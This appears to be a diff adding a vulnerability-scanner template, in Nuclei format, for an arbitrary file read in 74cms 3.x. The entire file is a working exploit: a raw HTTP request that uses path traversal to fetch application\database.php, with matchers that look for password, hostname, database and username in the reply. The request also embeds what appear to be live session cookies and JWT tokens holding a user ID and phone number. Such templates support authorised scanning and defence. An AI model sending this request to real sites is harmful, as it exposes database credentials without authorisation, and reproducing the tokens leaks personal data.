@@ -1,0 +1,34 @@
+id: 74cms-download-index-read
+info:
+  name: 74cms-3.x商用版download-index存在任意文件读取
+  author: lemonlove7
+  severity: high
+http:
+  - raw:
+      - |-
+        GET /index.php/index/download/index?url=..\\..\\application\\database.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: Hm_lvt_cbcae2ef192309b577e620c2c493b386=1763466810; HMACCOUNT=73EF44E77A00B368; Hm_lpvt_cbcae2ef192309b577e620c2c493b386=1763468506; qscms_subsiteid=1; qscms_visitor=%7B%22utype%22%3A1%2C%22mobile%22%3A%2218879094501%22%2C%22token%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjM0NzA1MzQsImV4cCI6MTc5NDY4MjUzNCwiaW5mbyI6eyJ1aWQiOjE1NzU5MiwidXR5cGUiOjEsIm1vYmlsZSI6IjE4ODc5MDk0NTAxIn19.4Z4U6FNiq-q7u-gEneXLf9TNfVA3Akfb1NAaVErVDDQ%22%7D
+        Sec-Ch-Ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"
+        Sec-Ch-Ua-Mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+        Accept: application/json, text/plain, */*
+        User-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjM0NzA1MzUsImV4cCI6MTc5NDY4MjUzNSwiaW5mbyI6eyJ1aWQiOjE1NzU5MiwidXR5cGUiOjEsIm1vYmlsZSI6IjE4ODc5MDk0NTAxIn19.gHn5x-DuIixIiaVUjt7jsqoPq4oIh-8sKDigKdFEfVA
+        Platform: web
+        Sec-Ch-Ua-Platform: "Windows"
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Priority: u=1, i
+        Connection: keep-alive
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - password
+          - hostname
+          - database
+          - username
+    matchers-condition: and
